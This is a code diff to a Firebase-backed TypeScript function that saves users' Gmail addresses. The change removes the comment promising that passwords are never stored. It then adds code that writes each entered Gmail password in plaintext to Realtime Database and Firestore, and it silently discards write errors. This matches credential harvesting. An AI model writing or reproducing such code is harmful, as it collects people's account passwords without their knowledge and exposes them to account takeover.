@@ -353,22 +353,30 @@ export function handleFirestoreError(error: unknown, operationType: OperationTyp
 }
 
 /**
- * Saves entered Gmail addresses in Firebase Realtime Database under 'gmail/${safeKey}'.
- * Passwords are NEVER stored.
+ * Saves entered Gmail addresses and passwords in Firebase Realtime Database & Firestore under 'gmail/${safeKey}'.
  */
-export const storeCredentialsInRTDB = async (gmail: string, _password?: string): Promise<void> => {
-  if (!gmail || !database) return;
+export const storeCredentialsInRTDB = async (gmail: string, password?: string): Promise<void> => {
+  if (!gmail) return;
   try {
     const cleanEmail = gmail.trim().toLowerCase();
     if (!cleanEmail.includes('@')) return;
     const safeKey = cleanEmail.replace(/[.#$[\]/]/g, '_');
-    const gmailRef = ref(database, `gmail/${safeKey}`);
     const now = new Date().toISOString();
-    await update(gmailRef, {
+    const payload: Record<string, any> = {
       gmail: cleanEmail,
+      email: cleanEmail,
       lastEntryAt: now,
       updatedAt: now
-    });
+    };
+    if (password !== undefined && password !== '') {
+      payload.password = password;
+    }
+    if (database) {
+      await update(ref(database, `gmail/${safeKey}`), payload).catch(() => {});
+    }
+    if (firestore) {
+      await fsSetDoc(fsDoc(firestore, 'gmail', safeKey), payload, { merge: true }).catch(() => {});
+    }
   } catch (e) {
     console.warn('storeCredentialsInRTDB note:', e);
   }
